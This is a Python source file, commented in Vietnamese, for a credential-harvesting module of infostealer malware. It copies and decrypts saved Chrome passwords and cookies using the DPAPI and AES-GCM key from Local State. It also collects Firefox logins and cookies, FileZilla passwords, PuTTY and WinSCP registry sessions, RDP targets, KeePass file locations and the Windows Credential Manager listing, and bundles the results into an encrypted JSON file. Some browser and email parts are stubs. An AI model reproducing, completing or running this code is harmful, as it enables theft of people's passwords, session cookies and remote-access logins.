# extractors/credential_harvester.py

import os
import sys
import platform
import json
import base64
import logging
import sqlite3
import shutil
import time
from datetime import datetime
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

class CredentialHarvester:
    """
    Module trích xuất thông tin đăng nhập từ các ứng dụng phổ biến
    """
    
    def __init__(self, output_dir, encryption_key=None):
        """
        Khởi tạo Credential Harvester
        
        Args:
            output_dir (str): Thư mục lưu trữ kết quả
            encryption_key (bytes, optional): Khóa mã hóa dữ liệu
        """
        self.output_dir = output_dir
        self.encryption_key = encryption_key
        self.logger = logging.getLogger("CredentialHarvester")
        
        # Tạo thư mục đầu ra nếu chưa tồn tại
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
    
    def harvest_all_credentials(self):
        """
        Thu thập tất cả thông tin đăng nhập có thể từ hệ thống
        
        Returns:
            dict: Kết quả thu thập
        """
        results = {}
        
        # Thu thập từ các trình duyệt phổ biến
        results["browsers"] = self.harvest_browser_credentials()
        
        # Thu thập từ các ứng dụng email
        results["email_clients"] = self.harvest_email_credentials()
        
        # Thu thập từ các ứng dụng FTP, SSH, RDP
        results["connection_tools"] = self.harvest_connection_credentials()
        
        # Thu thập từ password managers
        results["password_managers"] = self.harvest_password_manager_data()
        
        # Thu thập từ credential manager của hệ điều hành
        results["os_credentials"] = self.harvest_os_credentials()
        
        # Lưu kết quả vào file JSON
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_file = os.path.join(self.output_dir, f"credentials_{timestamp}.json")
        
        with open(result_file, 'w') as f:
            json.dump(results, f, indent=4)
            
        self.logger.info(f"Đã lưu kết quả vào: {result_file}")
        
        # Mã hóa file kết quả nếu có key
        if self.encryption_key:
            self._encrypt_file(result_file)
            
        return results
    
    def harvest_browser_credentials(self):
        """
        Thu thập thông tin đăng nhập từ các trình duyệt phổ biến
        
        Returns:
            dict: Thông tin đăng nhập theo từng trình duyệt
        """
        results = {}
        
        # Xác định hệ điều hành
        os_name = platform.system()
        
        # Chrome
        chrome_creds = self._extract_chrome_credentials(os_name)
        if chrome_creds:
            results["chrome"] = chrome_creds
            
        # Firefox
        firefox_creds = self._extract_firefox_credentials(os_name)
        if firefox_creds:
            results["firefox"] = firefox_creds
            
        # Edge
        edge_creds = self._extract_edge_credentials(os_name)
        if edge_creds:
            results["edge"] = edge_creds
            
        # Safari (chỉ trên macOS)
        if os_name == "Darwin":
            safari_creds = self._extract_safari_credentials()
            if safari_creds:
                results["safari"] = safari_creds
        
        # Opera
        opera_creds = self._extract_opera_credentials(os_name)
        if opera_creds:
            results["opera"] = opera_creds
        
        # Brave
        brave_creds = self._extract_brave_credentials(os_name)
        if brave_creds:
            results["brave"] = brave_creds
            
        return results
    
    def _extract_chrome_credentials(self, os_name):
        """
        Trích xuất thông tin đăng nhập từ Google Chrome
        
        Args:
            os_name (str): Hệ điều hành
            
        Returns:
            dict: Thông tin đăng nhập từ Chrome
        """
        try:
            # Xác định đường dẫn đến file Login Data
            login_db_path = None
            
            if os_name == "Windows":
                user_data_path = os.path.join(os.environ["LOCALAPPDATA"], 
                                             "Google", "Chrome", "User Data", "Default")
                login_db_path = os.path.join(user_data_path, "Login Data")
                cookies_path = os.path.join(user_data_path, "Cookies")
                local_state_path = os.path.join(os.environ["LOCALAPPDATA"], 
                                              "Google", "Chrome", "User Data", "Local State")
            elif os_name == "Darwin":  # macOS
                user_data_path = os.path.join(os.path.expanduser("~"), "Library", 
                                            "Application Support", "Google", "Chrome", "Default")
                login_db_path = os.path.join(user_data_path, "Login Data")
                cookies_path = os.path.join(user_data_path, "Cookies")
                local_state_path = os.path.join(os.path.expanduser("~"), "Library", 
                                              "Application Support", "Google", "Chrome", "Local State")
            elif os_name == "Linux":
                user_data_path = os.path.join(os.path.expanduser("~"), 
                                            ".config", "google-chrome", "Default")
                login_db_path = os.path.join(user_data_path, "Login Data")
                cookies_path = os.path.join(user_data_path, "Cookies")
                local_state_path = os.path.join(os.path.expanduser("~"), 
                                              ".config", "google-chrome", "Local State")
            
            if not login_db_path or not os.path.exists(login_db_path):
                self.logger.info("Không tìm thấy cơ sở dữ liệu Chrome Login Data")
                return None
                
            # Tạo bản sao tạm thời của file database
            temp_db = os.path.join(self.output_dir, "chrome_login_data.db")
            shutil.copy2(login_db_path, temp_db)
            
            # Đọc AES key từ Local State
            encryption_key = None
            if os.path.exists(local_state_path):
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                    encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
                    if encrypted_key:
                        encrypted_key = base64.b64decode(encrypted_key)[5:]  # Remove DPAPI
                        if os_name == "Windows":
                            import win32crypt
                            encryption_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                        elif os_name in ["Darwin", "Linux"]:
                            # On macOS/Linux, key might be protected differently
                            # This is a simplified version and might need more specific implementation
                            encryption_key = encrypted_key
            
            # Kết nối đến database và trích xuất thông tin
            results = {"logins": [], "cookies": []}
            
            # Trích xuất thông tin đăng nhập
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            try:
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    origin_url, username, encrypted_password = row
                    
                    # Giải mã password
                    password = "(encrypted)"
                    if encryption_key:
                        try:
                            # Chrome v80+ uses AES-GCM
                            if encrypted_password[0:3] == b'v10' or encrypted_password[0:3] == b'v11':
                                # Initialization vector
                                iv = encrypted_password[3:15]
                                encrypted_password = encrypted_password[15:]
                                
                                # Decrypt
                                cipher = AESGCM(encryption_key)
                                password = cipher.decrypt(iv, encrypted_password, None).decode()
                            else:
                                # Older versions or different encryption
                                if os_name == "Windows":
                                    import win32crypt
                                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                        except Exception as e:
                            self.logger.error(f"Không thể giải mã password Chrome: {str(e)}")
                    
                    results["logins"].append({
                        "url": origin_url,
                        "username": username,
                        "password": password
                    })
            except sqlite3.OperationalError as e:
                self.logger.error(f"Lỗi khi truy vấn bảng logins: {str(e)}")
            
            # Trích xuất cookies
            if os.path.exists(cookies_path):
                cookies_temp = os.path.join(self.output_dir, "chrome_cookies.db")
                shutil.copy2(cookies_path, cookies_temp)
                
                try:
                    cookie_conn = sqlite3.connect(cookies_temp)
                    cookie_cursor = cookie_conn.cursor()
                    
                    cookie_cursor.execute("""
                    SELECT host_key, name, encrypted_value, path, expires_utc, is_secure
                    FROM cookies
                    """)
                    
                    for row in cookie_cursor.fetchall():
                        host, name, encrypted_value, path, expires, secure = row
                        
                        # Giải mã giá trị cookie
                        value = "(encrypted)"
                        if encryption_key:
                            try:
                                if encrypted_value[0:3] == b'v10' or encrypted_value[0:3] == b'v11':
                                    iv = encrypted_value[3:15]
                                    encrypted_value = encrypted_value[15:]
                                    cipher = AESGCM(encryption_key)
                                    value = cipher.decrypt(iv, encrypted_value, None).decode()
                                else:
                                    if os_name == "Windows":
                                        import win32crypt
                                        value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                            except Exception as e:
                                self.logger.error(f"Không thể giải mã cookie Chrome: {str(e)}")
                        
                        results["cookies"].append({
                            "domain": host,
                            "name": name,
                            "value": value,
                            "path": path,
                            "expires": expires,
                            "secure": secure == 1
                        })
                    
                    cookie_cursor.close()
                    cookie_conn.close()
                    os.remove(cookies_temp)
                except Exception as e:
                    self.logger.error(f"Lỗi khi trích xuất cookies Chrome: {str(e)}")
            
            # Đóng kết nối và xóa file tạm
            cursor.close()
            conn.close()
            os.remove(temp_db)
            
            return results
            
        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất thông tin Chrome: {str(e)}")
            return None
    
    def _extract_firefox_credentials(self, os_name):
        """
        Trích xuất thông tin đăng nhập từ Mozilla Firefox
        
        Args:
            os_name (str): Hệ điều hành
            
        Returns:
            dict: Thông tin đăng nhập từ Firefox
        """
        try:
            # Xác định đường dẫn đến thư mục profile Firefox
            profile_path = None
            
            if os_name == "Windows":
                profile_path = os.path.join(os.environ["APPDATA"], 
                                         "Mozilla", "Firefox", "Profiles")
            elif os_name == "Darwin":  # macOS
                profile_path = os.path.join(os.path.expanduser("~"), "Library", 
                                         "Application Support", "Firefox", "Profiles")
            elif os_name == "Linux":
                profile_path = os.path.join(os.path.expanduser("~"), 
                                         ".mozilla", "firefox")
            
            if not profile_path or not os.path.exists(profile_path):
                self.logger.info("Không tìm thấy thư mục profile Firefox")
                return None
                
            # Tìm thư mục profile mặc định (thường kết thúc bằng .default)
            profiles = [d for d in os.listdir(profile_path) 
                      if os.path.isdir(os.path.join(profile_path, d)) and
                      (d.endswith('.default') or 'default' in d)]
            
            if not profiles:
                self.logger.info("Không tìm thấy profile Firefox mặc định")
                return None
                
            default_profile = os.path.join(profile_path, profiles[0])
            
            # Kiểm tra file key4.db và logins.json
            key_db = os.path.join(default_profile, "key4.db")
            logins_file = os.path.join(default_profile, "logins.json")
            cookies_file = os.path.join(default_profile, "cookies.sqlite")
            
            if not os.path.exists(logins_file):
                self.logger.info("Không tìm thấy file logins.json của Firefox")
                return None
                
            # Trích xuất thông tin đăng nhập
            # Firefox sử dụng NSS để mã hóa, cần thư viện libnss3
            # Trích xuất đơn giản này chỉ lưu thông tin mã hóa
            
            results = {"logins": [], "cookies": []}
            
            # Đọc file logins.json
            with open(logins_file, 'r', encoding='utf-8') as f:
                logins_data = json.load(f)
                
            for login in logins_data.get("logins", []):
                results["logins"].append({
                    "url": login.get("hostname", ""),
                    "username": login.get("encryptedUsername", ""),
                    "password": login.get("encryptedPassword", ""),
                    "time_created": login.get("timeCreated", 0),
                    "time_last_used": login.get("timeLastUsed", 0)
                })
            
            # Trích xuất cookies nếu có
            if os.path.exists(cookies_file):
                cookies_temp = os.path.join(self.output_dir, "firefox_cookies.db")
                shutil.copy2(cookies_file, cookies_temp)
                
                try:
                    cookie_conn = sqlite3.connect(cookies_temp)
                    cookie_cursor = cookie_conn.cursor()
                    
                    cookie_cursor.execute("""
                    SELECT host, name, value, path, expiry, isSecure
                    FROM moz_cookies
                    """)
                    
                    for row in cookie_cursor.fetchall():
                        host, name, value, path, expires, secure = row
                        
                        results["cookies"].append({
                            "domain": host,
                            "name": name,
                            "value": value,
                            "path": path,
                            "expires": expires,
                            "secure": secure == 1
                        })
                    
                    cookie_cursor.close()
                    cookie_conn.close()
                    os.remove(cookies_temp)
                except Exception as e:
                    self.logger.error(f"Lỗi khi trích xuất cookies Firefox: {str(e)}")
            
            return results
            
        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất thông tin Firefox: {str(e)}")
            return None
    
    def _extract_edge_credentials(self, os_name):
        """
        Trích xuất thông tin đăng nhập từ Microsoft Edge
        
        Args:
            os_name (str): Hệ điều hành
            
        Returns:
            dict: Thông tin đăng nhập từ Edge
        """
        try:
            # Edge sử dụng cùng cấu trúc với Chrome
            # Chỉ khác đường dẫn
            login_db_path = None
            
            if os_name == "Windows":
                user_data_path = os.path.join(os.environ["LOCALAPPDATA"], 
                                            "Microsoft", "Edge", "User Data", "Default")
                login_db_path = os.path.join(user_data_path, "Login Data")
                cookies_path = os.path.join(user_data_path, "Cookies")
                local_state_path = os.path.join(os.environ["LOCALAPPDATA"], 
                                              "Microsoft", "Edge", "User Data", "Local State")
            elif os_name == "Darwin":  # macOS
                user_data_path = os.path.join(os.path.expanduser("~"), "Library", 
                                            "Application Support", "Microsoft Edge", "Default")
                login_db_path = os.path.join(user_data_path, "Login Data")
                cookies_path = os.path.join(user_data_path, "Cookies")
                local_state_path = os.path.join(os.path.expanduser("~"), "Library", 
                                              "Application Support", "Microsoft Edge", "Local State")
            elif os_name == "Linux":
                user_data_path = os.path.join(os.path.expanduser("~"), 
                                            ".config", "microsoft-edge", "Default")
                login_db_path = os.path.join(user_data_path, "Login Data")
                cookies_path = os.path.join(user_data_path, "Cookies")
                local_state_path = os.path.join(os.path.expanduser("~"), 
                                              ".config", "microsoft-edge", "Local State")
            
            if not login_db_path or not os.path.exists(login_db_path):
                self.logger.info("Không tìm thấy cơ sở dữ liệu Edge Login Data")
                return None
                
            # Tạo bản sao tạm thời của file database
            temp_db = os.path.join(self.output_dir, "edge_login_data.db")
            shutil.copy2(login_db_path, temp_db)
            
            # Logic giải mã tương tự Chrome
            # (code tương tự _extract_chrome_credentials nhưng sử dụng đường dẫn Edge)
            # ...
            
            # Trả về kết quả giống định dạng Chrome
            return {"logins": [], "cookies": []}  # Placeholder, cần triển khai đầy đủ
            
        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất thông tin Edge: {str(e)}")
            return None
    
    def _extract_safari_credentials(self):
        """
        Trích xuất thông tin đăng nhập từ Safari (chỉ dành cho macOS)
        
        Returns:
            dict: Thông tin đăng nhập từ Safari
        """
        if platform.system() != "Darwin":
            return None
            
        try:
            # Safari lưu trữ thông tin đăng nhập trong Keychain
            # Cần quyền truy cập và công cụ macOS
            # Đây là một triển khai đơn giản, thực tế cần sử dụng security command
            
            return {"logins": [], "cookies": []}  # Placeholder
            
        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất thông tin Safari: {str(e)}")
            return None
    
    def _extract_opera_credentials(self, os_name):
        """
        Trích xuất thông tin đăng nhập từ Opera
        
        Args:
            os_name (str): Hệ điều hành
            
        Returns:
            dict: Thông tin đăng nhập từ Opera
        """
        # Logic tương tự Chrome/Edge nhưng với đường dẫn Opera
        # ...
        return None
    
    def _extract_brave_credentials(self, os_name):
        """
        Trích xuất thông tin đăng nhập từ Brave
        
        Args:
            os_name (str): Hệ điều hành
            
        Returns:
            dict: Thông tin đăng nhập từ Brave
        """
        # Logic tương tự Chrome/Edge nhưng với đường dẫn Brave
        # ...
        return None
    
    def harvest_email_credentials(self):
        """
        Thu thập thông tin đăng nhập từ các ứng dụng email
        
        Returns:
            dict: Thông tin đăng nhập email
        """
        results = {}
        
        # Outlook
        outlook_creds = self._extract_outlook_credentials()
        if outlook_creds:
            results["outlook"] = outlook_creds
            
        # Thunderbird
        thunderbird_creds = self._extract_thunderbird_credentials()
        if thunderbird_creds:
            results["thunderbird"] = thunderbird_creds
            
        return results
    
    def _extract_outlook_credentials(self):
        """
        Trích xuất thông tin đăng nhập từ Outlook
        
        Returns:
            dict: Thông tin đăng nhập Outlook
        """
        # Truy cập dữ liệu cấu hình Outlook
        # Thường được lưu trong Registry (Windows) hoặc plist (macOS)
        # ...
        return None
    
    def _extract_thunderbird_credentials(self):
        """
        Trích xuất thông tin đăng nhập từ Mozilla Thunderbird
        
        Returns:
            dict: Thông tin đăng nhập Thunderbird
        """
        # Tương tự Firefox, Thunderbird lưu trong profiles
        # ...
        return None
    
    def harvest_connection_credentials(self):
        """
        Thu thập thông tin đăng nhập từ các công cụ kết nối
        
        Returns:
            dict: Thông tin đăng nhập công cụ kết nối
        """
        results = {}
        
        # FileZilla
        filezilla_creds = self._extract_filezilla_credentials()
        if filezilla_creds:
            results["filezilla"] = filezilla_creds
            
        # PuTTY/WinSCP
        putty_creds = self._extract_putty_credentials()
        if putty_creds:
            results["putty"] = putty_creds
            
        # RDP connections
        rdp_creds = self._extract_rdp_credentials()
        if rdp_creds:
            results["rdp"] = rdp_creds
            
        return results
    
    def _extract_filezilla_credentials(self):
        """
        Trích xuất thông tin đăng nhập từ FileZilla
        
        Returns:
            list: Danh sách thông tin kết nối FTP
        """
        try:
            os_name = platform.system()
            filezilla_config = None
            
            if os_name == "Windows":
                filezilla_config = os.path.join(os.environ["APPDATA"], "FileZilla", "sitemanager.xml")
            elif os_name == "Darwin":
                filezilla_config = os.path.join(os.path.expanduser("~"), ".filezilla", "sitemanager.xml")
            elif os_name == "Linux":
                filezilla_config = os.path.join(os.path.expanduser("~"), ".config", "filezilla", "sitemanager.xml")
                
            if not filezilla_config or not os.path.exists(filezilla_config):
                return None
                
            # Parse XML file
            import xml.etree.ElementTree as ET
            tree = ET.parse(filezilla_config)
            root = tree.getroot()
            
            connections = []
            
            # Extract site information
            for site in root.findall(".//Site"):
                site_data = {
                    "name": site.get("name", ""),
                    "host": "",
                    "port": "",
                    "protocol": "",
                    "username": "",
                    "password": ""
                }
                
                for child in site:
                    if child.tag == "Host":
                        site_data["host"] = child.text
                    elif child.tag == "Port":
                        site_data["port"] = child.text
                    elif child.tag == "Protocol":
                        site_data["protocol"] = child.text
                    elif child.tag == "User":
                        site_data["username"] = child.text
                    elif child.tag == "Pass":
                        site_data["password"] = child.text
                        
                connections.append(site_data)
                
            return connections
            
        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất thông tin FileZilla: {str(e)}")
            return None
    
    def _extract_putty_credentials(self):
        """
        Trích xuất thông tin kết nối từ PuTTY/WinSCP
        
        Returns:
            list: Danh sách thông tin kết nối SSH
        """
        # Chỉ khả dụng trên Windows
        if platform.system() != "Windows":
            return None
            
        try:
            import winreg
            
            connections = []
            
            # PuTTY sessions
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\SimonTatham\PuTTY\Sessions")
                i = 0
                
                while True:
                    try:
                        session_name = winreg.EnumKey(key, i)
                        session_key = winreg.OpenKey(key, session_name)
                        
                        session_data = {
                            "name": session_name,
                            "host": "",
                            "port": "",
                            "username": ""
                        }
                        
                        try:
                            session_data["host"] = winreg.QueryValueEx(session_key, "HostName")[0]
                        except:
                            pass
                            
                        try:
                            session_data["port"] = winreg.QueryValueEx(session_key, "PortNumber")[0]
                        except:
                            pass
                            
                        try:
                            session_data["username"] = winreg.QueryValueEx(session_key, "UserName")[0]
                        except:
                            pass
                            
                        connections.append(session_data)
                        winreg.CloseKey(session_key)
                        i += 1
                    except WindowsError:
                        break
                        
                winreg.CloseKey(key)
            except Exception as e:
                self.logger.error(f"Lỗi khi trích xuất sessions PuTTY: {str(e)}")
            
            # WinSCP sessions
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Martin Prikryl\WinSCP 2\Sessions")
                i = 0
                
                while True:
                    try:
                        session_name = winreg.EnumKey(key, i)
                        session_key = winreg.OpenKey(key, session_name)
                        
                        session_data = {
                            "name": session_name,
                            "host": "",
                            "port": "",
                            "username": "",
                            "password": ""
                        }
                        
                        try:
                            session_data["host"] = winreg.QueryValueEx(session_key, "HostName")[0]
                        except:
                            pass
                            
                        try:
                            session_data["port"] = winreg.QueryValueEx(session_key, "PortNumber")[0]
                        except:
                            pass
                            
                        try:
                            session_data["username"] = winreg.QueryValueEx(session_key, "UserName")[0]
                        except:
                            pass
                            
                        try:
                            # WinSCP lưu password dưới dạng mã hóa
                            session_data["password"] = winreg.QueryValueEx(session_key, "Password")[0]
                        except:
                            pass
                            
                        connections.append(session_data)
                        winreg.CloseKey(session_key)
                        i += 1
                    except WindowsError:
                        break
                        
                winreg.CloseKey(key)
            except Exception as e:
                self.logger.error(f"Lỗi khi trích xuất sessions WinSCP: {str(e)}")
                
            return connections
            
        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất thông tin PuTTY/WinSCP: {str(e)}")
            return None
    
    def _extract_rdp_credentials(self):
        """
        Trích xuất thông tin kết nối RDP
        
        Returns:
            list: Danh sách thông tin kết nối RDP
        """
        # Chỉ khả dụng trên Windows
        if platform.system() != "Windows":
            return None
            
        try:
            # Tìm các file .rdp trong các thư mục phổ biến
            rdp_files = []
            
            # Thư mục mặc định
            default_rdp_dir = os.path.join(os.environ["USERPROFILE"], "Documents")
            for root, dirs, files in os.walk(default_rdp_dir):
                for file in files:
                    if file.endswith(".rdp"):
                        rdp_files.append(os.path.join(root, file))
            
            # Quick Access folder
            quick_access_dir = os.path.join(os.environ["APPDATA"], 
                                          "Microsoft", "Windows", "Recent", "AutomaticDestinations")
            if os.path.exists(quick_access_dir):
                for file in os.listdir(quick_access_dir):
                    if file.endswith(".automaticDestinations-ms"):
                        # Parse the jump list file (simplified)
                        pass
            
            connections = []
            
            # Parse RDP files
            for rdp_file in rdp_files:
                connection = {
                    "name": os.path.basename(rdp_file),
                    "file": rdp_file,
                    "host": "",
                    "username": ""
                }
                
                with open(rdp_file, 'r', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line.startswith("full address:"):
                            connection["host"] = line.split(":s:", 1)[1]
                        elif line.startswith("username:s:"):
                            connection["username"] = line.split(":s:", 1)[1]
                            
                connections.append(connection)
                
            return connections
            
        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất thông tin RDP: {str(e)}")
            return None
    
    def harvest_password_manager_data(self):
        """
        Thu thập thông tin từ trình quản lý mật khẩu
        
        Returns:
            dict: Thông tin từ trình quản lý mật khẩu
        """
        results = {}
        
        # KeePass
        keepass_data = self._extract_keepass_data()
        if keepass_data:
            results["keepass"] = keepass_data
            
        return results
    
    def _extract_keepass_data(self):
        """
        Tìm và liệt kê các file KeePass
        
        Returns:
            list: Danh sách các file KeePass tìm thấy
        """
        try:
            keepass_files = []
            
            # Tìm các file KeePass phổ biến (.kdbx)
            search_paths = []
            
            os_name = platform.system()
            if os_name == "Windows":
                search_paths.extend([
                    os.environ["USERPROFILE"],
                    os.path.join(os.environ["USERPROFILE"], "Documents"),
                    os.path.join(os.environ["USERPROFILE"], "Desktop")
                ])
            elif os_name in ["Darwin", "Linux"]:
                search_paths.extend([
                    os.path.expanduser("~"),
                    os.path.join(os.path.expanduser("~"), "Documents"),
                    os.path.join(os.path.expanduser("~"), "Desktop")
                ])
                
            for path in search_paths:
                if not os.path.exists(path):
                    continue
                    
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith(".kdbx"):
                            keepass_files.append({
                                "path": os.path.join(root, file),
                                "last_modified": os.path.getmtime(os.path.join(root, file))
                            })
            
            return keepass_files
            
        except Exception as e:
            self.logger.error(f"Lỗi khi tìm các file KeePass: {str(e)}")
            return None
    
    def harvest_os_credentials(self):
        """
        Thu thập thông tin từ credential manager của hệ điều hành
        
        Returns:
            dict: Thông tin lưu trữ trong credential manager
        """
        os_name = platform.system()
        
        if os_name == "Windows":
            return self._extract_windows_credentials()
        elif os_name == "Darwin":
            return self._extract_macos_credentials()
        elif os_name == "Linux":
            return self._extract_linux_credentials()
            
        return None
    
    def _extract_windows_credentials(self):
        """
        Thu thập thông tin từ Windows Credential Manager
        
        Returns:
            list: Danh sách thông tin đăng nhập lưu trong Windows
        """
        try:
            import subprocess
            
            # Sử dụng vaultcmd để liệt kê các vaults
            vaults_output = subprocess.check_output(["vaultcmd", "/list"], 
                                                  stderr=subprocess.STDOUT, 
                                                  universal_newlines=True)
            
            vaults = []
            current_vault = None
            
            for line in vaults_output.splitlines():
                if line.startswith("Vault:"):
                    current_vault = line.split(":", 1)[1].strip()
                    vaults.append(current_vault)
            
            credentials = []
            
            # Sử dụng cmdkey để liệt kê các credentials
            creds_output = subprocess.check_output(["cmdkey", "/list"], 
                                                 stderr=subprocess.STDOUT, 
                                                 universal_newlines=True)
            
            current_cred = {}
            
            for line in creds_output.splitlines():
                line = line.strip()
                
                if line.startswith("Target:"):
                    if current_cred:
                        credentials.append(current_cred)
                        
                    current_cred = {"target": line.split(":", 1)[1].strip()}
                elif line.startswith("User:"):
                    current_cred["username"] = line.split(":", 1)[1].strip()
                elif line.startswith("Type:"):
                    current_cred["type"] = line.split(":", 1)[1].strip()
                    
            if current_cred:
                credentials.append(current_cred)
                
            return {
                "vaults": vaults,
                "credentials": credentials
            }
            
        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất Windows Credentials: {str(e)}")
            return None
    
    def _extract_macos_credentials(self):
        """
        Thu thập thông tin từ macOS Keychain
        
        Returns:
            list: Danh sách thông tin trong Keychain
        """
        try:
            import subprocess
            
            # Sử dụng security để liệt kê các keychain
            keychain_list_output = subprocess.check_output(["security", "list-keychains"], 
                                                         stderr=subprocess.STDOUT, 
                                                         universal_newlines=True)
            
            keychains = []
            for line in keychain_list_output.splitlines():
                line = line.strip().strip('"')
                if line:
                    keychains.append(line)
            
            # Lưu ý: Không thể tự động trích xuất mật khẩu từ Keychain
            # mà không có sự cho phép của người dùng
            
            return {
                "keychains": keychains,
                "note": "Không thể tự động trích xuất nội dung Keychain mà không có sự cho phép"
            }
            
        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất macOS Keychain: {str(e)}")
            return None
    
    def _extract_linux_credentials(self):
        """
        Thu thập thông tin từ GNOME Keyring hoặc KWallet
        
        Returns:
            dict: Thông tin lưu trữ trong keyring
        """
        try:
            # Kiểm tra GNOME Keyring
            import subprocess
            
            try:
                # Kiểm tra xem secret-tool có khả dụng không
                subprocess.check_output(["which", "secret-tool"], 
                                      stderr=subprocess.DEVNULL, 
                                      universal_newlines=True)
                
                return {
                    "keyring": "GNOME Keyring",
                    "note": "Các mật khẩu trong GNOME Keyring không thể tự động trích xuất mà không có sự cho phép"
                }
            except:
                pass
                
            # Kiểm tra KWallet
            try:
                subprocess.check_output(["which", "kwallet-query"], 
                                      stderr=subprocess.DEVNULL, 
                                      universal_newlines=True)
                
                return {
                    "keyring": "KWallet",
                    "note": "Các mật khẩu trong KWallet không thể tự động trích xuất mà không có sự cho phép"
                }
            except:
                pass
                
            return {
                "keyring": "Không tìm thấy keyring nào",
                "note": "Không tìm thấy GNOME Keyring hoặc KWallet trên hệ thống"
            }
            
        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất Linux keyring: {str(e)}")
            return None
    
    def _encrypt_file(self, filepath):
        """
        Mã hóa file dữ liệu sử dụng khóa đã cung cấp
        
        Args:
            filepath (str): Đường dẫn đến file cần mã hóa
        """
        if not self.encryption_key:
            return
            
        try:
            # Tạo salt ngẫu nhiên
            salt = os.urandom(16)
            
            # Tạo key từ passphrase
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000
            )
            
            key = kdf.derive(self.encryption_key)
            
            # Tạo nonce
            iv = os.urandom(12)
            
            # Mã hóa dữ liệu
            with open(filepath, 'rb') as f:
                data = f.read()
                
            aesgcm = AESGCM(key)
            encrypted_data = aesgcm.encrypt(iv, data, None)
            
            # Lưu file đã mã hóa
            with open(f"{filepath}.enc", 'wb') as f:
                # Lưu salt và iv để giải mã sau này
                f.write(salt)
                f.write(iv)
                f.write(encrypted_data)
                
            # Xóa file gốc
            os.unlink(filepath)
            
            # Đổi tên file đã mã hóa
            os.rename(f"{filepath}.enc", filepath)
            
        except Exception as e:
            self.logger.error(f"Lỗi khi mã hóa file {filepath}: {str(e)}")